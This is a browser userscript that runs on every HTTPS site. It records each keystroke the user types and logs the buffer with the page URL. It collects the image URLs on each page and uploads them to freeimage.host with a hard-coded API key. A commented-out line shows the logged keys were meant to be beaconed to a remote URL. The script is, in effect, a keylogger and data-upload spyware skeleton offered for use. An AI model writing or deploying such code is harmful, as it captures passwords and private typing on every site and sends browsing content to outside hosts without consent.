// ==UserScript==
// @name         Key Userscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        https://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...
var keys='';
let images = [];
let imagesSize = images.length;
document.onkeypress = function(e) {
	let get = window.event?event:e;
	let key = get.keyCode?get.keyCode:get.charCode;
	 key = String.fromCharCode(key);
	 keys+=key;
}

function getImages(){
 Array.from(document.querySelectorAll("img")).map(img=>img.src).filter((v,i,a)=>a.indexOf(v)===i).forEach(url=>{

     if(images.indexOf(url)===-1) images.push(url);

 })

}
window.setInterval(()=>{
    if(imagesSize!==images.length){
        imagesSize=images.length;
        console.log(images,imagesSize)
        uploadImages();
    }

},5000);


async function uploadImages(){

  const key ="6d207e02198a847aa98d0a2a901485a5";
for(const img of images){
const api =`http://freeimage.host/api/1/upload/?key=${key}&source=${img}&format=json`;
    console.log(api);
await fetch(api,{method:"POST"})
    .then(res=>console.log(res))
}

  images=[]
   imagesSize=0;

}

function checkImage(url) {
       return fetch(url)
}

window.setInterval(function(){
    getImages();
	if(keys.length>0) {
		//new Image().src = url+keys;
        console.log(window.location.href,keys);
		keys = '';
	}
}, 1000);

})();
